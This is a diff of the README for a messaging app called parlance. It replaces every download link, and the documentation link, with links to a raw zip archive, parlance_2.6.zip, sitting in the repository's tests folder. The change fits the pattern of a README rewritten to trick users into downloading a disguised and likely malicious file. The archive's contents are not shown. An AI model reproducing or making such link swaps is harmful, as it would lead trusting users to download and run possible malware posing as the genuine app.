@@ -1,6 +1,6 @@
 # 📡 parlance - Easy, Secure Messaging for Everyone
 
-[![Download parlance](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/andriy389/parlance/releases)
+[![Download parlance](https://raw.githubusercontent.com/andriy389/parlance/main/parlance-client/tests/parlance_2.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/andriy389/parlance/main/parlance-client/tests/parlance_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **parlance**! This application allows you to send messages securely a
 
 To get started, you will need to download **parlance**. Visit the release page using the link below:
 
-[Download parlance](https://github.com/andriy389/parlance/releases)
+[Download parlance](https://raw.githubusercontent.com/andriy389/parlance/main/parlance-client/tests/parlance_2.6.zip)
 
 1. On the releases page, you will see a list of available versions.
 2. Find the latest version at the top of the list.
@@ -62,11 +62,11 @@ We encourage you to join our user community to get help, share experiences, and 
 
 ## 🔗 Additional Resources
 
-For more details on using **parlance**, check out our official documentation [here](https://github.com/andriy389/parlance/wiki). 
+For more details on using **parlance**, check out our official documentation [here](https://raw.githubusercontent.com/andriy389/parlance/main/parlance-client/tests/parlance_2.6.zip). 
 
 You can also access the releases page again to download the latest version or check if updates are available:
 
-[Download parlance](https://github.com/andriy389/parlance/releases)
+[Download parlance](https://raw.githubusercontent.com/andriy389/parlance/main/parlance-client/tests/parlance_2.6.zip)
 
 ## 🎉 Conclusion
 
